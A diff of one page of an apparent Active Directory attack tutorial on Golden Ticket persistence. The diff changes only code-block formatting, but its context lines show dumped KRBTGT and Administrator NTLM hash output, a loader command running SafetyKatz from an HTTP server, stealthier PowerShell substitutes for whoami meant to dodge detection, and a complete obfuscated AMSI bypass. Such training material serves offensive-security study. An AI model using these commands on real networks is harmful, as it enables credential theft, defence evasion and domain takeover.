@@ -251,7 +251,7 @@ To get the AES256 hash, we again use an LDAP query to the domain controller. Thi
 <p>Depending on the specific requirements of our attack, we may also need additional user information such as the username, user principal name (UPN), and group memberships. This information helps us tailor the Golden Ticket to match the desired user profile accurately.
 We gather this information through more LDAP queries, targeting the relevant attributes of the user object in Active Directory. For example, the sAMAccountName attribute gives us the username, while the memberOf attribute lists the groups the user belongs to.
 Below we do have our KRBTGT dumped information. we have the Domain SID S-1-5-21-210670787-2521448726-163245708 and the Relative ID 502  and also it’s AES256 hash that we will be using forge the Golden Ticket.
-<pre><code>SAM Username         : krbtgt
+<pre><code class="language-bash">SAM Username         : krbtgt
 Account Type         : 30000000 ( USER_OBJECT )
 User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
 Account expiration   :
@@ -413,7 +413,7 @@ Before we run our next command, we should be sure that we are hosting our Safety
 C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe -args "%Pwn% /patch" "exit"
 <h2>Hashes</h2>
 
-<pre><code>RID  : 000001f4 (500)
+<pre><code class="language-bash">RID  : 000001f4 (500)
 User : Administrator
 LM   :
 NTLM : 43b70d2d979805f419e02882997f8f3f
@@ -963,15 +963,15 @@ Instead, here are stealthier alternatives to retrieve the same information:
 <h3>1. Alternative for whoami (Current User)</h3>
 
 Instead of:
-<pre><code>whoami
+<pre><code class="language-powershell">whoami
 </code></pre>
 
 Use:
-<pre><code>[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+<pre><code class="language-powershell">[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 </code></pre>
 
 or
-<pre><code>$env:USERNAME
+<pre><code class="language-powershell">$env:USERNAME
 </code></pre>
 
 ✅ Why?
@@ -984,15 +984,15 @@ or
 <h3>2. Alternative for whoami /priv (User Privileges)</h3>
 
 Instead of:
-<pre><code>whoami /priv
+<pre><code class="language-powershell">whoami /priv
 </code></pre>
 
 Use:
-<pre><code>(Get-Process -Id $PID).StartInfo.EnvironmentVariables["USERNAME"]
+<pre><code class="language-powershell">(Get-Process -Id $PID).StartInfo.EnvironmentVariables["USERNAME"]
 </code></pre>
 
 or
-<pre><code>(Get-WmiObject -Class Win32_Process | Where-Object { $_.ProcessId -eq $PID }).GetOwner().User
+<pre><code class="language-powershell">(Get-WmiObject -Class Win32_Process | Where-Object { $_.ProcessId -eq $PID }).GetOwner().User
 </code></pre>
 
 ✅ Why?
@@ -1005,15 +1005,15 @@ or
 <h3>3. Alternative for whoami /groups (Group Membership)</h3>
 
 Instead of:
-<pre><code>whoami /groups
+<pre><code class="language-powershell">whoami /groups
 </code></pre>
 
 Use:
-<pre><code>(New-Object System.Security.Principal.WindowsIdentity($env:USERNAME)).Groups | ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]).Value }
+<pre><code class="language-powershell">(New-Object System.Security.Principal.WindowsIdentity($env:USERNAME)).Groups | ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]).Value }
 </code></pre>
 
 or
-<pre><code>(Get-WmiObject Win32_GroupUser | Where-Object { $_.GroupComponent -match $env:USERNAME }) | Select-Object PartComponent
+<pre><code class="language-powershell">(Get-WmiObject Win32_GroupUser | Where-Object { $_.GroupComponent -match $env:USERNAME }) | Select-Object PartComponent
 </code></pre>
 
 ✅ Why?
@@ -1024,15 +1024,15 @@ or
 <h3>4. Alternative for whoami /all (Complete User Info)</h3>
 
 Instead of:
-<pre><code>whoami /all
+<pre><code class="language-powershell">whoami /all
 </code></pre>
 
 Use:
-<pre><code>[System.Security.Principal.WindowsIdentity]::GetCurrent() | Select-Object -Property Name, User, Groups
+<pre><code class="language-powershell">[System.Security.Principal.WindowsIdentity]::GetCurrent() | Select-Object -Property Name, User, Groups
 </code></pre>
 
 or
-<pre><code>$WinIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+<pre><code class="language-powershell">$WinIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
 $WinIdentity.Name
 $WinIdentity.Groups | ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]).Value }
 </code></pre>
@@ -1045,11 +1045,11 @@ $WinIdentity.Groups | ForEach-Object { $_.Translate([System.Security.Principal.N
 <h3>5. Alternative for whoami /logonid (Logon Session)</h3>
 
 Instead of:
-<pre><code>whoami /logonid
+<pre><code class="language-powershell">whoami /logonid
 </code></pre>
 
 Use:
-<pre><code>(New-Object System.Security.Principal.WindowsIdentity([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)).Token
+<pre><code class="language-powershell">(New-Object System.Security.Principal.WindowsIdentity([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)).Token
 </code></pre>
 
 ✅ Why?
@@ -1074,7 +1074,7 @@ Enter-PSSession -Session $dc_session
 <h2>AMSI Bypass</h2>
 
 Once we do access the target remotely let’s do an AMSI bypass to avoid some AMSI detection from the defense mechanisms in implemented on the target.
-<pre><code>S<code>eT-It</code>em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) (<a href=" "{1}{0}"-F'F','rE' ">TYpE</a> ) ; ( Get-varI<code>A</code>BLE (('1Q'+'2U') +'zX' ) -VaL )."A<code>ss</code>Embly"."GET<code>TY</code>Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g<code>etf</code>iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE<code>T</code>VaLUE"(${n<code>ULl},${t</code>RuE} )
+<pre><code class="language-bash">S<code>eT-It</code>em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) (<a href=" "{1}{0}"-F'F','rE' ">TYpE</a> ) ; ( Get-varI<code>A</code>BLE (('1Q'+'2U') +'zX' ) -VaL )."A<code>ss</code>Embly"."GET<code>TY</code>Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g<code>etf</code>iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE<code>T</code>VaLUE"(${n<code>ULl},${t</code>RuE} )
 </code></pre>
 
 <img src="./images/screenshot_202.png" alt="">
@@ -1162,7 +1162,7 @@ Here’s a table of services that can be forged for Kerberos tickets along with 
 <li>RDP (Service: TERMSRV)</li>
 <li>LDAP (Service: LDAP)</li>
 </ol>
-          <div class="part-navigation">
+<div class="part-navigation">
             <a href="part-13-privilege-escalation-rbcdresource-based-constraine.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Privilege Escalation - RBCD(Re</a>
             <a href="part-15-domain-persistence-silver-ticket-attack.html">Next: Domain Persistence - Silver Ti <ion-icon name="arrow-forward-outline"></ion-icon></a>
           </div>
